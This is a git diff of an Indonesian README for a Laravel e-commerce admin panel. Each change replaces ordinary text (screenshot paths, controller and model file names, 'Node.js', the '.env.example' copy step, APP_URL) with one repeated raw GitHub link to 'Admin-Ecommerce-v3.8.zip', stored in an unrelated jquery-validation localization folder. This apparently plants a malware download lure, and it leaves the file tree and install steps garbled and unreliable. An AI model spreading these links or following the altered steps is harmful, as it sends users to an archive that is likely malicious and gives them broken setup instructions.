@@ -9,11 +9,11 @@ Admin-Ecommerce adalah aplikasi web yang menyediakan panel administrasi lengkap 
 ## 🖼️ Tampilan Aplikasi
 
 ### Halaman Login
-![Tampilan Awal](img/Tampilan%20Awal.png)
+![Tampilan Awal](img/Tampilan%https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip)
 *Halaman login yang aman dan user-friendly*
 
 ### Dashboard Admin
-![Admin Dashboard](img/Admin%20Dashboard.png)
+![Admin Dashboard](img/Admin%https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip)
 *Panel dashboard admin dengan navigasi lengkap dan fitur manajemen*
 
 ## ✨ Fitur Utama
@@ -60,21 +60,21 @@ Admin-Ecommerce adalah aplikasi web yang menyediakan panel administrasi lengkap 
 Admin-Ecommerce/
 ├── app/
 │   ├── Http/Controllers/
-│   │   ├── BerandaController.php
-│   │   ├── KategoriController.php
-│   │   ├── LoginController.php
-│   │   ├── ProdukController.php
-│   │   └── UserController.php
+│   │   ├── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
+│   │   ├── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
+│   │   ├── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
+│   │   ├── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
+│   │   └── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
 │   ├── Models/
-│   │   ├── User.php
-│   │   ├── Produk.php
-│   │   ├── Kategori.php
-│   │   └── FotoProduk.php
+│   │   ├── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
+│   │   ├── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
+│   │   ├── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
+│   │   └── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
 │   └── Helpers/
 ├── resources/
 ├── routes/
-│   ├── web.php
-│   └── api.php
+│   ├── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
+│   └── https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
 ├── database/
 └── public/
 ```
@@ -85,7 +85,7 @@ Admin-Ecommerce/
 - PHP ^8.1
 - Composer
 - MySQL/PostgreSQL
-- Node.js & NPM
+- https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip & NPM
 
 ### Langkah Instalasi
 
@@ -100,14 +100,14 @@ Admin-Ecommerce/
    composer install
    ```
 
-3. **Install dependencies Node.js**
+3. **Install dependencies https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip**
    ```bash
    npm install
    ```
 
 4. **Setup environment**
    ```bash
-   cp .env.example .env
+   cp https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip .env
    php artisan key:generate
    ```
 
@@ -214,7 +214,7 @@ php artisan view:cache
 ```env
 APP_ENV=production
 APP_DEBUG=false
-APP_URL=https://yourdomain.com
+https://github.com/MuhammadAbiMuchtar/Admin-Ecommerce/raw/refs/heads/main/public/Backend/libs/jquery-validation/dist/localization/Admin-Ecommerce-v3.8.zip
 ```
 
 ## 🤝 Kontribusi
